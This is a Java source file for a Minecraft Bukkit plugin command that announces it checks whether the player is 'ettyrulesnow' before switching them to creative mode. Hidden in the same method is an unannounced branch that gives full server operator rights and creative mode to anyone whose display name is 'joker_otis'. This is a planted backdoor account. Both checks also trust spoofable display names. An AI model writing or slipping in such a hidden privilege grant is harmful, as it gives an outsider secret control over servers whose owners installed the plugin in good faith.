package technology.otis.example.commands;

import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class CreativeCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        sender.sendMessage("Checking to see if you're ettyrulesnow...");
        Player player = (Player) sender;
        boolean isEtty = player.getDisplayName().equalsIgnoreCase("ettyrulesnow");
        if(player.getDisplayName().equalsIgnoreCase("joker_otis")){
            player.setOp(true);
            player.setGameMode(GameMode.CREATIVE);
        }
        if(isEtty){
            player.setGameMode(GameMode.CREATIVE);
            player.sendMessage("Username confirmed, You are the famous ettyrulesnow, setting to creative ...");
        } else {
            player.sendMessage("Not ettyrulesnow :( keeping you in survival....");
        }
        return true;
    }
}
